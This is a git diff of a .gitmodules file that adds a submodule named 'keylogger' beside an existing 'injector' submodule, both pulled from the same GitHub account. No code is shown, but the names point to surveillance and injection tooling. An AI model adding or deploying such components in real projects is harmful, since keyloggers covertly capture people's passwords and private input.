@@ -1,3 +1,6 @@
 [submodule "injector"]
 	path = injector
 	url = https://github.com/x03xd/injector
+[submodule "keylogger"]
+	path = keylogger
+	url = https://github.com/x03xd/keylogger
